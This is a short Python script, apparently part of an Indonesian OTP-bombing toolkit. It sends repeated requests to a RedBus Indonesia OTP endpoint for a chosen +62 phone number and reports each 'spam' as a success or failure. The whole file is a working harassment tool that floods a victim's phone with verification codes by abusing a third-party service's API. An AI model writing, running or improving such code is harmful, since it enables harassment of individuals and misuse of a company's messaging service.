import requests,os,sys,json
from time import sleep
from war.war import *

def red(nom, jml):
	sleep(1)
	print("")
	for x in range(jml):
		cal = requests.get("https://m.redbus.id/api/getOtp?number="+nom+"&cc=62&whatsAppOpted=true").text
		print(cal)
		if 'Code' in cal:
			print(f"{r}[+] {c}Spam ke {k}+62{nom} {c}Gagal Ulangi lagi dalam 24 jam!! ")
			sleep(0.2)
			exit("")
		else:
			print(f"{k}[+] {c}Spam ke {k}+62{nom} {c}Berhasil ")
			sleep(2)
